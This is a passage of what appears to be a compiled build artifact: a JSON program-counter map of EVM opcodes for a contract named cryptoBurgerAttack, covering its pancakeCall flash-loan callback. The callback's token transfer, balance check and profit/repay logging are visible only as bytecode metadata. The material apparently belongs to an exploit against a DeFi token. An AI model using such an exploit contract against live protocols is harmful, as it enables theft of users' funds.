      "op": "MSTORE",
      "path": "0"
    },
    "9383": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9385": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9387": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9389": {
      "op": "SHL"
    },
    "9390": {
      "op": "SUB"
    },
    "9391": {
      "op": "DUP11"
    },
    "9392": {
      "op": "DUP2"
    },
    "9393": {
      "op": "AND"
    },
    "9394": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "9396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP4",
      "path": "0"
    },
    "9397": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "ADD",
      "path": "0"
    },
    "9398": {
      "op": "MSTORE"
    },
    "9399": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "9401": {
      "op": "DUP3"
    },
    "9402": {
      "op": "ADD"
    },
    "9403": {
      "op": "DUP4"
    },
    "9404": {
      "op": "SWAP1"
    },
    "9405": {
      "op": "MSTORE"
    },
    "9406": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11754,
        11790
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9407": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11754,
        11790
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "9408": {
      "op": "POP"
    },
    "9409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11829
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9410": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11829
      ],
      "op": "DUP9",
      "path": "0"
    },
    "9411": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11829
      ],
      "op": "AND",
      "path": "0"
    },
    "9412": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11829
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9413": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11829
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "9418": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11829
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9419": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "9421": {
      "op": "ADD"
    },
    "9422": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "9424": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9426": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9427": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9428": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP4",
      "path": "0"
    },
    "9429": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "SUB",
      "path": "0"
    },
    "9430": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9431": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9433": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP8",
      "path": "0"
    },
    "9434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "GAS",
      "path": "0"
    },
    "9435": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "CALL",
      "path": "0"
    },
    "9436": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9437": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9438": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9439": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x24EC"
    },
    "9442": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "9443": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9444": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9446": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9447": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "9448": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9449": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9451": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "REVERT",
      "path": "0"
    },
    "9452": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9453": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "POP",
      "path": "0"
    },
    "9454": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "POP",
      "path": "0"
    },
    "9455": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "POP",
      "path": "0"
    },
    "9456": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "POP",
      "path": "0"
    },
    "9457": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9459": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9460": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9461": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9463": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "NOT",
      "path": "0"
    },
    "9464": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9466": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9467": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "ADD",
      "path": "0"
    },
    "9468": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "AND",
      "path": "0"
    },
    "9469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9470": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "ADD",
      "path": "0"
    },
    "9471": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9472": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9474": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "POP",
      "path": "0"
    },
    "9476": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9477": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "ADD",
      "path": "0"
    },
    "9478": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9479": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2510"
    },
    "9482": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2EAC"
    },
    "9487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11801,
        11850
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9489": {
      "op": "POP"
    },
    "9490": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 93,
      "value": "0x40"
    },
    "9492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9493": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9494": {
      "op": "DUP2"
    },
    "9495": {
      "op": "DUP2"
    },
    "9496": {
      "op": "MSTORE"
    },
    "9497": {
      "op": "PUSH1",
      "value": "0xC"
    },
    "9499": {
      "op": "DUP2"
    },
    "9500": {
      "op": "DUP4"
    },
    "9501": {
      "op": "ADD"
    },
    "9502": {
      "op": "MSTORE"
    },
    "9503": {
      "op": "PUSH12",
      "value": "0x14995C185E48185B5BDD5B9D"
    },
    "9516": {
      "op": "PUSH1",
      "value": "0xA2"
    },
    "9518": {
      "op": "SHL"
    },
    "9519": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "9521": {
      "op": "DUP3"
    },
    "9522": {
      "op": "ADD"
    },
    "9523": {
      "op": "MSTORE"
    },
    "9524": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9526": {
      "op": "DUP2"
    },
    "9527": {
      "op": "ADD"
    },
    "9528": {
      "op": "DUP4"
    },
    "9529": {
      "op": "SWAP1"
    },
    "9530": {
      "op": "MSTORE"
    },
    "9531": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9532": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9533": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "9535": {
      "op": "DUP1"
    },
    "9536": {
      "op": "MLOAD"
    },
    "9537": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9539": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "9542": {
      "op": "DUP4"
    },
    "9543": {
      "op": "CODECOPY"
    },
    "9544": {
      "op": "DUP2"
    },
    "9545": {
      "op": "MLOAD"
    },
    "9546": {
      "op": "SWAP2"
    },
    "9547": {
      "op": "MSTORE"
    },
    "9548": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9549": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9550": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9551": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "SUB",
      "path": "0"
    },
    "9552": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "9554": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "ADD",
      "path": "0"
    },
    "9555": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9556": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11865,
        11899
      ],
      "op": "LOG1",
      "path": "0"
    },
    "9557": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        11982
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 94,
      "value": "0x0"
    },
    "9559": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        11982
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "9560": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9562": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9563": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "9568": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "9570": {
      "op": "SHL"
    },
    "9571": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9572": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9573": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12001,
        12005
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "9574": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "9576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9577": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "ADD",
      "path": "0"
    },
    "9578": {
      "op": "MSTORE"
    },
    "9579": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "9581": {
      "op": "DUP1"
    },
    "9582": {
      "op": "MLOAD"
    },
    "9583": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9585": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "9588": {
      "op": "DUP4"
    },
    "9589": {
      "op": "CODECOPY"
    },
    "9590": {
      "op": "DUP2"
    },
    "9591": {
      "op": "MLOAD"
    },
    "9592": {
      "op": "SWAP2"
    },
    "9593": {
      "op": "MSTORE"
    },
    "9594": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9595": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9597": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9599": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9601": {
      "op": "SHL"
    },
    "9602": {
      "op": "SUB"
    },
    "9603": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        11982
      ],
      "op": "AND",
      "path": "0"
    },
    "9604": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        11982
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9605": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        11992
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "9610": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        11992
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9611": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "9613": {
      "op": "ADD"
    },
    "9614": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "9616": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9618": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9619": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9620": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP4",
      "path": "0"
    },
    "9621": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "SUB",
      "path": "0"
    },
    "9622": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9623": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP7",
      "path": "0"
    },
    "9624": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "GAS",
      "path": "0"
    },
    "9625": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "9626": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9627": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9628": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9629": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x25AA"
    },
    "9632": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "9633": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9634": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9636": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9637": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "9638": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9639": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9641": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "REVERT",
      "path": "0"
    },
    "9642": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "POP",
      "path": "0"
    },
    "9644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "POP",
      "path": "0"
    },
    "9645": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "POP",
      "path": "0"
    },
    "9646": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "POP",
      "path": "0"
    },
    "9647": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9649": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9650": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9651": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9653": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "NOT",
      "path": "0"
    },
    "9654": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9656": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9657": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "ADD",
      "path": "0"
    },
    "9658": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "AND",
      "path": "0"
    },
    "9659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9660": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "ADD",
      "path": "0"
    },
    "9661": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9662": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9664": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9665": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "POP",
      "path": "0"
    },
    "9666": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9667": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "ADD",
      "path": "0"
    },
    "9668": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9669": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x25CE"
    },
    "9672": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9673": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9674": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "9677": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11968,
        12007
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9678": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11968,
        12007
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9679": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9681": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9682": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x260C"
    },
    "9685": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9686": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9687": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "9689": {
      "op": "DUP1"
    },
    "9690": {
      "op": "DUP3"
    },
    "9691": {
      "op": "MSTORE"
    },
    "9692": {
      "op": "PUSH1",
      "value": "0x14"
    },
    "9694": {
      "op": "SWAP1"
    },
    "9695": {
      "op": "DUP3"
    },
    "9696": {
      "op": "ADD"
    },
    "9697": {
      "op": "MSTORE"
    },
    "9698": {
      "op": "PUSH20",
      "value": "0x283937B334BA1030B33A32B9103932B830BC9D1"
    },
    "9719": {
      "op": "PUSH1",
      "value": "0x65"
    },
    "9721": {
      "op": "SHL"
    },
    "9722": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "9724": {
      "op": "DUP3"
    },
    "9725": {
      "op": "ADD"
    },
    "9726": {
      "op": "MSTORE"
    },
    "9727": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9729": {
      "op": "DUP2"
    },
    "9730": {
      "op": "ADD"
    },
    "9731": {
      "op": "SWAP2"
    },
    "9732": {
      "op": "SWAP1"
    },
    "9733": {
      "op": "SWAP2"
    },
    "9734": {
      "op": "MSTORE"
    },
    "9735": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "9737": {
      "op": "ADD"
    },
    "9738": {
      "op": "SWAP1"
    },
    "9739": {
      "op": "JUMP"
    },
    "9740": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9741": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9745": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "SUB",
      "path": "0"
    },
    "9747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11915,
        12017
      ],
      "op": "LOG1",
      "path": "0"
    },
    "9749": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12074
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 95,
      "value": "0x1"
    },
    "9751": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12074
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "9752": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9754": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9755": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        12058,
        12088
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9756": {
      "op": "PUSH4",
